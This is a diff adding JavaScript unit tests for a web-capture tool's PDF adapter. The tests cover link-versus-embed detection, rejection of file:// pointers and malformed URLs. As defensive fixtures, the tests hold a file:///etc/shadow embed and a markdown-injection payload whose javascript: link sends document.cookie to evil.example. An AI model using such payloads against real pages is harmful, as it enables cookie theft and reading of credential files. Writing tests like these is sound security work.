@@ -83,3 +83,54 @@ test("an HTML page with no PDF anywhere in it is not claimed", () => {
   const tree = g.MonoDomLite.parse("<html><body><p>Just a page.</p></body></html>");
   assert.equal(ad.match({ url: "https://x.test/page", tree }), false);
 });
+
+test("an article that merely links to a PDF keeps its own text", () => {
+  // The failure this guards against is silent and total: the adapter claims
+  // the page, and readable.md becomes "the real artifact is a PDF" instead of
+  // the article that was actually on screen.
+  const [ad] = g.MonoAdapters.all().filter((a) => a.name === "pdf");
+  const tree = g.MonoDomLite.parse(fixture("pdf_linked.html"));
+  const url = "https://coastal.example/notes/what-the-keepers-wrote-down";
+
+  assert.equal(ad.match({ url, tree }), false, "a link in the body is not a PDF page");
+  assert.equal(run(url, fixture("pdf_linked.html")), null, "so the generic pipeline gets the page");
+});
+
+test("a download link next to a real embed does not change what is resolved", () => {
+  // pdf_embedded.html has both an <iframe> of the file and a download <a>.
+  // The embed is the signal; the link is decoration.
+  const out = run("https://coastal.example/papers/12", fixture("pdf_embedded.html"));
+  assert.equal(out.meta.resolvedPdfUrl, "https://coastal.example/files/working-paper-12.pdf");
+});
+
+test("a PDF pointer is only ever an http(s) URL", () => {
+  const [ad] = g.MonoAdapters.all().filter((a) => a.name === "pdf");
+  const html = `<html><body><embed type="application/pdf" src="file:///etc/shadow"></body></html>`;
+  const tree = g.MonoDomLite.parse(html);
+
+  assert.equal(ad.match({ url: "https://x.test/viewer", tree }), false, "a file:// embed is not a capture target");
+  assert.equal(run("https://x.test/viewer", html), null);
+
+  // And the same through the tab's own URL.
+  assert.equal(ad.match({ url: "file:///etc/shadow.pdf", tree: g.MonoDomLite.parse("<html><body></body></html>") }), false);
+});
+
+test("a filename that is not valid percent-encoding does not throw", () => {
+  const url = "https://files.example/%ZZ%E0%A4%A.pdf";
+  const out = run(url, "<html><body></body></html>", { contentType: "application/pdf" });
+
+  assert.equal(out.adapter, "pdf");
+  assert.equal(out.meta.resolvedPdfUrl, url);
+  assert.ok(out.title, "a title is still produced from the undecodable name");
+});
+
+test("markdown syntax in a wrapper page's title cannot forge a link", () => {
+  const html = `<html><head>
+    <meta property="og:title" content="Report](javascript:fetch('//evil.example/'+document.cookie)) x">
+    </head><body>
+    <embed type="application/pdf" src="/files/report.pdf">
+    </body></html>`;
+  const out = run("https://x.test/viewer", html);
+
+  assert.doesNotMatch(out.markdown, /(?<!\\)\]\(javascript:/i);
+});
